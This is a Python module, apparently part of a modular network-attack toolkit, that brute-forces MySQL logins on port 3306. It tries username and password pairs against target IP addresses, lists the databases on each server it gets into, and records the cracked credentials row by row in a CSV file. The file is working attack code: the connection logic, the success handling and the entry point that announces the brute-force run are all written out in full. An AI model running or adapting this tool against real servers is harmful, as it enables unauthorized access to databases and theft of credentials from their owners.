"""
sql_connector.py — MySQL brute force (port 3306).

Thin adapter over BaseConnector (#12). Only attempt()/result_rows() and the module-level
b_* discovery globals live here; queue/worker/run_bruteforce are shared.

Two things make this the odd one out, both handled by class attributes rather than a fork of the
worker: QUEUE_HAS_MAC is False (the CSV keys on IP, not MAC), and one successful auth writes one
row per visible database.
"""
import logging
import pymysql
from base_connector import BaseConnector, BaseBruteforce
from logger import Logger

logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)

b_class = "SQLBruteforce"
b_module = "sql_connector"
b_status = "brute_force_sql"
b_port = 3306
b_parent = None


class SQLConnector(BaseConnector):
    PORT = 3306
    HEADER = "IP Address,User,Password,Port,Database\n"
    OUTFILE_ATTR = "sqlfile"
    PROGRESS_LABEL = "SQL"
    # This connector's CSV has no MAC/Hostname columns, so the queue carries neither.
    QUEUE_HAS_MAC = False

    def attempt(self, adresse_ip, user, password):
        """Connect and list databases. Returns the database list, or True if there are none.

        `databases or True` is deliberate: authenticating IS the win here, so a server that lets us
        in but shows no databases must still record the cracked credential. Returning the bare list
        would make that read as a failed login. Contrast SMB, where an empty list genuinely means
        no accessible share and so is correctly falsy.
        """
        try:
            conn = pymysql.connect(
                host=adresse_ip,
                user=user,
                password=password,
                port=3306,
                connect_timeout=10,   # #4: bound the connect and both I/O directions
                read_timeout=15,
                write_timeout=15,
            )
            with conn.cursor() as cursor:
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]
            conn.close()
            logger.info(f"Successfully connected to {adresse_ip} with user {user}")
            logger.info(f"Available databases: {', '.join(databases)}")
            return databases or True
        except pymysql.Error as e:
            logger.error(f"Failed to connect to {adresse_ip} with user {user}: {e}")
            return False

    def result_rows(self, outcome, adresse_ip, user, password, mac_address, hostname, port):
        """One row per database. `outcome` is True (authenticated, nothing visible) or the list."""
        databases = outcome if isinstance(outcome, list) else []
        return [[adresse_ip, user, password, port, db] for db in databases]


class SQLBruteforce(BaseBruteforce):
    connector_class = SQLConnector
    display_name = "SQLBruteforce"


if __name__ == "__main__":
    from shared import SharedData
    shared_data = SharedData()
    try:
        sql_bruteforce = SQLBruteforce(shared_data)
        logger.info("Starting SQL brute-force attack on port 3306...")
        for row in shared_data.read_data():
            ip = row["IPs"]
            sql_bruteforce.execute(ip, b_port, row, b_status)
        logger.info(f"Total successful attempts: {len(sql_bruteforce.connector.results)}")
    except Exception as e:
        logger.error(f"Error: {e}")
